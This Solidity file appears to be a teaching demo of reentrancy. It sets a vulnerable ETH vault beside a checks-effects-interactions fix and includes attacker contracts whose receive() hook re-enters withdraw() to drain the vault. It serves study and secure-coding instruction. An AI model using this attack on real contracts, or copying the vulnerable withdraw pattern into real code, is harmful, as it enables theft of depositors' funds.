// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// A simple ETH vault: deposit, then withdraw your balance.
// ❌ VULNERABLE — sends the ETH BEFORE zeroing the balance.
contract VaultVulnerable {
    mapping(address => uint256) public balance;
    function deposit() external payable { balance[msg.sender] += msg.value; }
    function seed() external payable {}
    function withdraw() external {
        uint256 amt = balance[msg.sender];
        require(amt > 0, "no balance");
        (bool ok, ) = msg.sender.call{value: amt}("");   // interaction FIRST (the bug)
        require(ok, "send failed");
        balance[msg.sender] = 0;                          // effect LAST — too late
    }
}

// ✅ FIXED — checks-effects-interactions: zero the balance BEFORE the call.
contract VaultFixed {
    mapping(address => uint256) public balance;
    function deposit() external payable { balance[msg.sender] += msg.value; }
    function seed() external payable {}
    function withdraw() external {
        uint256 amt = balance[msg.sender];
        require(amt > 0, "no balance");
        balance[msg.sender] = 0;                          // effect FIRST (the fix)
        (bool ok, ) = msg.sender.call{value: amt}("");    // interaction LAST
        require(ok, "send failed");
    }
}

// ▶ Attacker vs the OLD vault. Deploy with Value 3 (seeds the pool with others' deposits),
//   then MANUALLY: attackerDeposit() (Value 1) -> poolBalance() -> steal() -> poolBalance() / myLoot()
contract Attacker_OLD {
    VaultVulnerable public vault;
    constructor() payable { vault = new VaultVulnerable(); vault.seed{value: msg.value}(); }
    function attackerDeposit() external payable { vault.deposit{value: msg.value}(); }
    function steal() external { vault.withdraw(); }
    receive() external payable { if (address(vault).balance >= 1 ether) vault.withdraw(); }
    function poolBalance() external view returns (uint256) { return address(vault).balance / 1e18; }
    function myLoot()      external view returns (uint256) { return address(this).balance / 1e18; }
    function sweep(address to) external { (bool ok,) = payable(to).call{value: address(this).balance}(""); require(ok, "sweep failed"); }
}

// ▶ Same attacker vs the FIXED vault. steal() now reverts.
contract Attacker_NEW {
    VaultFixed public vault;
    constructor() payable { vault = new VaultFixed(); vault.seed{value: msg.value}(); }
    function attackerDeposit() external payable { vault.deposit{value: msg.value}(); }
    function steal() external { vault.withdraw(); }
    receive() external payable { if (address(vault).balance >= 1 ether) vault.withdraw(); }
    function poolBalance() external view returns (uint256) { return address(vault).balance / 1e18; }
    function myLoot()      external view returns (uint256) { return address(this).balance / 1e18; }
    function sweep(address to) external { (bool ok,) = payable(to).call{value: address(this).balance}(""); require(ok, "sweep failed"); }
}
